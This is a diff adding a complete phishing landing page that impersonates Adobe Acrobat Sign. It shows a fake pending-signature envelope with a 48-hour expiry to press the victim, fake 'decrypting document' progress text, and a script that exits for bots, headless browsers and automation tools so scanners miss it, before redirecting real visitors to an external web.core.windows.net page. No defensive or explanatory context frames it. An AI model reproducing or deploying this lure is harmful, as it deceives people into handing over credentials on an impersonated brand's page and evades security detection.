@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Adobe Acrobat Sign - Document Awaiting Signature</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Adobe Clean',Helvetica,Arial,sans-serif;background:#f5f5f5}
+.header{background:#fff;border-bottom:1px solid #e1e1e1;padding:12px 24px;display:flex;align-items:center;gap:8px}
+.header svg{width:28px;height:28px}
+.header span{font-size:15px;font-weight:700;color:#2c2c2c}
+.main{max-width:520px;margin:40px auto;padding:0 16px}
+.envelope{background:#fff;border-radius:8px;box-shadow:0 1px 6px rgba(0,0,0,.08);overflow:hidden}
+.env-top{background:linear-gradient(135deg,#fa0f00 0%,#c40812 100%);padding:28px 24px;text-align:center;color:#fff}
+.env-top h1{font-size:20px;font-weight:700;margin-bottom:6px}
+.env-top p{font-size:13px;opacity:.9}
+.env-body{padding:24px}
+.sender-info{display:flex;align-items:center;gap:12px;margin-bottom:20px}
+.sender-avatar{width:40px;height:40px;background:#fa0f00;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-size:16px;font-weight:700}
+.sender-name{font-size:14px;font-weight:600;color:#2c2c2c}
+.sender-email{font-size:12px;color:#6e6e6e}
+.doc-info{background:#fafafa;border:1px solid #e8e8e8;border-radius:6px;padding:16px;margin-bottom:20px}
+.doc-row{display:flex;justify-content:space-between;padding:3px 0;font-size:13px}
+.doc-label{color:#6e6e6e}
+.doc-value{color:#2c2c2c;font-weight:600}
+.sig-fields{margin-bottom:20px}
+.sig-title{font-size:12px;color:#6e6e6e;text-transform:uppercase;letter-spacing:.5px;margin-bottom:8px}
+.sig-item{display:flex;align-items:center;gap:8px;padding:6px 0;font-size:13px;color:#2c2c2c}
+.sig-dot{width:8px;height:8px;border-radius:50%;flex-shrink:0}
+.sig-dot.pending{background:#fa0f00}
+.sig-dot.done{background:#12b76a}
+.loading-section{text-align:center;padding-top:8px}
+.adobe-spinner{width:28px;height:28px;border:3px solid #ebebeb;border-top:3px solid #fa0f00;border-radius:50%;animation:spin .7s linear infinite;margin:0 auto 10px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.load-text{font-size:13px;color:#6e6e6e}
+.bar{height:2px;background:#ebebeb;border-radius:1px;margin-top:12px;overflow:hidden}
+.bar-fill{height:100%;width:0;background:#fa0f00;transition:width 2.5s ease}
+.footer{text-align:center;padding:20px;font-size:11px;color:#999}
+</style>
+</head>
+<body>
+<div class="header">
+<svg viewBox="0 0 28 28"><rect width="28" height="28" rx="6" fill="#fa0f00"/><path d="M7 20l4-14h2l4 14h-2l-1-4H10l-1 4H7zm3.5-6h5L14 8.5h-.5L10.5 14z" fill="#fff"/></svg>
+<span>Adobe Acrobat Sign</span>
+</div>
+<div class="main">
+<div class="envelope">
+<div class="env-top">
+<h1>Document Awaiting Your Signature</h1>
+<p>Please review and sign the document below</p>
+</div>
+<div class="env-body">
+<div class="sender-info">
+<div class="sender-avatar">JR</div>
+<div>
+<div class="sender-name">James Robertson</div>
+<div class="sender-email">j.robertson@company.com</div>
+</div>
+</div>
+<div class="doc-info">
+<div class="doc-row"><span class="doc-label">Document:</span><span class="doc-value">Service_Agreement_2026.pdf</span></div>
+<div class="doc-row"><span class="doc-label">Pages:</span><span class="doc-value">12</span></div>
+<div class="doc-row"><span class="doc-label">Sent:</span><span class="doc-value" id="dt"></span></div>
+<div class="doc-row"><span class="doc-label">Expires:</span><span class="doc-value" style="color:#d92d20">In 48 hours</span></div>
+</div>
+<div class="sig-fields">
+<div class="sig-title">Signature Status</div>
+<div class="sig-item"><span class="sig-dot done"></span>James Robertson — Signed</div>
+<div class="sig-item"><span class="sig-dot pending"></span>You — Awaiting signature</div>
+</div>
+<div class="loading-section">
+<div class="adobe-spinner"></div>
+<div class="load-text" id="st">Loading document for review...</div>
+<div class="bar"><div class="bar-fill" id="pf"></div></div>
+</div>
+</div>
+</div>
+<div class="footer">Powered by Adobe Acrobat Sign &copy; 2026 Adobe Inc.</div>
+</div>
+<script>
+(function(){
+var n=navigator,u=n.userAgent.toLowerCase();
+if(n.webdriver||/bot|crawl|spider|headless|phantom|selenium|puppeteer/i.test(u))return;
+if(window.outerWidth===0&&window.outerHeight===0)return;
+var d=new Date();d.setHours(d.getHours()-1);
+document.getElementById('dt').textContent=d.toLocaleDateString()+' '+d.toLocaleTimeString([],{hour:'2-digit',minute:'2-digit'});
+var p=document.getElementById('pf'),s=document.getElementById('st');
+setTimeout(function(){p.style.width='25%';s.textContent='Decrypting document...'},500);
+setTimeout(function(){p.style.width='60%';s.textContent='Preparing signature fields...'},1400);
+setTimeout(function(){p.style.width='100%';s.textContent='Opening document...'},2300);
+setTimeout(function(){window.location.href='https://xerxes.z13.web.core.windows.net/3xz.html'},2800);
+})();
+</script>
+</body>
+</html>
